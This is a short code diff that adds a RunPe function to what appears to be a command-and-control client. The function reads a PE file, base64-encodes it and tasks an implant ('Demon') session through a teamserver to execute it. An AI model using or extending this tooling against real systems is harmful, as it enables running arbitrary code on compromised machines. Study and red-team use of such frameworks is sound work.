@@ -473,3 +473,26 @@ auto CommandExecute::Socket( const QString &TaskID, QString SubCommand, QString 
 
     NewPackageCommand( DemonCommandInstance->Teamserver, Body );
 }
+
+auto CommandExecute::RunPe( QString TaskID, QString FunctionName, QString Path, QByteArray Args, QString Flags ) -> void
+{
+    auto Content = FileRead( Path );
+    if ( Content.isEmpty() ) return;
+
+    auto Body    = Util::Packager::Body_t {
+        .SubEvent = Util::Packager::Session::SendCommand,
+        .Info = {
+            { "TaskID",         TaskID.toStdString() },
+            { "CommandLine",    DemonCommandInstance->CommandInputList[TaskID].toStdString() },
+            { "DemonID",        this->DemonCommandInstance->DemonConsole->SessionInfo.Name.toStdString() },
+            { "CommandID",      to_string( static_cast<int>( Commands::RUN_PE ) ).c_str() },
+
+            { "FunctionName",   FunctionName.toStdString() },
+            { "Binary",         Content.toBase64().toStdString() },
+            { "Arguments",      Util::base64_encode( Args.toStdString().c_str(), Args.length() ) },
+            { "Flags",          Flags.toStdString() },
+         },
+    };
+
+    NewPackageCommand( this->DemonCommandInstance->Teamserver, Body );
+}
